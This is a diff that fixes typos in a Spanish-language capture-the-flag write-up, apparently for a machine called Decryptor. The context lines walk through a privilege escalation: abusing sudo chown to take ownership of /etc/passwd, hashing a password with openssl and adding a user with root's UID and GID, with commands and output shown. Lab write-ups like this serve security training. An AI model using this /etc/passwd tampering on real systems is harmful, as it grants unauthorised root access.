@@ -391,7 +391,7 @@ Vamos a hacerlo!!!
 
 ><span style="color:Cyan">! Escalada de Privilegios </span>
 
-Vamos a cambiar de propietario el archivo ``/etc/passwd` para que sea nuestro usuario chiquero.
+Vamos a cambiar de propietario el archivo `/etc/passwd` para que sea nuestro usuario chiquero.
 
 ```bash
 chiquero@Decryptor:/home/mario$ who
@@ -400,7 +400,7 @@ chiquero@Decryptor:/home/mario$ sudo /usr/bin/chown chiquero /etc/passwd
 chiquero@Decryptor:/home/mario$ ls -la /etc/passwd
 -rw-r--r-- 1 chiquero root 1290 May 21 07:56 /etc/passwd
 ```
-Ahora podemos crear un usuario con permisos de root, pero necesitamos una contraseña cifrada para este usuario. Debemos generarla, ya que no puede ser en texto plano. Para esto, utilizaremos el comando `openssl`.`
+Ahora podemos crear un usuario con permisos de root, pero necesitamos una contraseña cifrada para este usuario. Debemos generarla, ya que no puede ser en texto plano. Para esto, utilizaremos el comando `openssl`.
 
 ```bash
 chiquero@Decryptor:/home/mario$ openssl passwd goku123
@@ -441,7 +441,7 @@ chiquero:x:1002:1002::/home/chiquero:/bin/bash
 goku:$1$V3UaTZN4$SISwXiYffpXFLh8OJTqIu.:0:0::/home/goku:/bin/bash
 chiquero@Decryptor:/home/mario$ 
 ```
-Òbservamos en la penultima linea que el usuario `goku` se creo exitosamente y con el UID y GUID de `root`.
+Observamos en la penultima linea que el usuario `goku` se creo exitosamente y con el UID y GUID de `root`.
 
 Accedemos al usario mas poderoso de todos `goku` y validamos si es cierto.
 
